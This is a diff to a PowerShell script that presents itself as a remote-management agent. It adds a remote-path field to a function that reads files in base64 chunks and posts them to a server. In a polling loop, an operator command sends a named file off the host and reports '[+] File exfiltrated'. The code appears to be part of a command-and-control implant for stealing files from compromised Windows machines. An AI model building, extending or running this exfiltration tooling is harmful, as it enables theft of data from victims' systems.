@@ -741,6 +741,7 @@ function Send-RmmTextResult {
 function Send-RmmFileDownload {
     param(
         [Parameter(Mandatory = $true)][string]$FilePath,
+        [string]$RemotePath = $FilePath,
         [hashtable]$Headers = @{}
     )
     $fileName = Split-Path $FilePath -Leaf
@@ -753,11 +754,12 @@ function Send-RmmFileDownload {
         $fileLen = $fs.Length
         if ($fileLen -eq 0) {
             $payload = @{
-                filename  = $fileName
-                upload_id = $uploadId
-                offset    = 0
-                eof       = $true
-                content   = ''
+                filename     = $fileName
+                remote_path  = $RemotePath
+                upload_id    = $uploadId
+                offset       = 0
+                eof          = $true
+                content      = ''
             } | ConvertTo-Json -Compress
             Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $payload -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction Stop
             return
@@ -775,11 +777,12 @@ function Send-RmmFileDownload {
             }
             $eof = ($offset + $n) -ge $fileLen
             $payload = @{
-                filename  = $fileName
-                upload_id = $uploadId
-                offset    = $offset
-                eof       = $eof
-                content   = $b64
+                filename     = $fileName
+                remote_path  = $RemotePath
+                upload_id    = $uploadId
+                offset       = $offset
+                eof          = $eof
+                content      = $b64
             } | ConvertTo-Json -Compress
             Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $payload -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction Stop
             $offset += $n
@@ -1759,7 +1762,7 @@ while ($true) {
                 $filePath = $command.Substring(12).Trim()
                 if (Test-Path $filePath -PathType Leaf) {
                     try {
-                        Send-RmmFileDownload -FilePath $filePath -Headers $headers
+                        Send-RmmFileDownload -FilePath $filePath -RemotePath $filePath -Headers $headers
                         Write-Host "[+] File exfiltrated: $filePath" -ForegroundColor Green
                     } catch {
                         $err = "Download failed: $($_.Exception.Message)"
